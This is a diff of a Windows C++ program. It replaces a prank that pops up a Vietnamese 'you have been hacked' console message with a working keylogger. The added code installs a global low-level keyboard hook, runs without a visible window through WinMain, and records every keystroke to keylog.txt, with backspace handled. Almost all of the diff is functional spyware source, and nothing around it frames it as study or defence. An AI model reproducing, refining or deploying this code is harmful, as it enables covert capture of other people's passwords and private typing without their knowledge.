@@ -2,30 +2,74 @@
 #include <fstream>
 #include <string>
 
+HHOOK hKeyboardHook;
+std::ofstream logFile;
+std::string logBuffer;
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode >= 0 && wParam == WM_KEYDOWN)
+    {
+        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
+        DWORD vkCode = kbdStruct->vkCode;
+        DWORD scanCode = kbdStruct->scanCode;
+
+        CHAR keyName[128];
+        GetKeyNameTextA(scanCode << 16, keyName, 128);
+
+        if (vkCode == VK_RETURN)
+        {
+            // Enter key - do nothing
+        }
+        else if (vkCode == VK_BACK)
+        {
+            // Backspace key - remove last character from buffer
+            if (!logBuffer.empty())
+            {
+                logBuffer.pop_back();
+                logFile.seekp(-1, std::ios_base::end);
+                logFile.put(' ');
+                logFile.seekp(-1, std::ios_base::end);
+            }
+        }
+        else if (vkCode == VK_SPACE)
+        {
+            logBuffer += ' ';
+            logFile << ' ';
+        }
+        else if (vkCode >= 0x30 && vkCode <= 0x5A)
+        {
+            char c = (char)vkCode;
+            logBuffer += c;
+            logFile << c;
+        }
+
+        logFile.flush();
+    }
+    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nCmdShow)
 {
-    // Chạy chương trình trong nền mà không mở cmd
-    // Không cần ShowWindow vì WinMain đã là entry point cho ứng dụng GUI
+    logFile.open("keylog.txt", std::ios::in | std::ios::out | std::ios::app);
+    logFile.seekp(0, std::ios::end);
+    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
-    // Chờ 10 giây
-    Sleep(10000);
-
-    // Thực hiện công việc của bạn ở đây
-    // Hiển thị cmd với thông báo
-    STARTUPINFO si = { sizeof(STARTUPINFO) };
-    PROCESS_INFORMATION pi;
-
-    // Tạo lệnh để mở cmd và hiển thị thông báo
-    std::wstring cmd = L"cmd.exe /c echo Bạn đã bị hack :) && pause";
-
-    // Tạo process mới để hiển thị cmd
-    if (CreateProcess(NULL, const_cast<LPWSTR>(cmd.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    if (hKeyboardHook == NULL)
     {
-        // Đóng handles để tránh rò rỉ tài nguyên
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        return 1;
     }
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(hKeyboardHook);
+    logFile.close();
 
     return 0;
 }
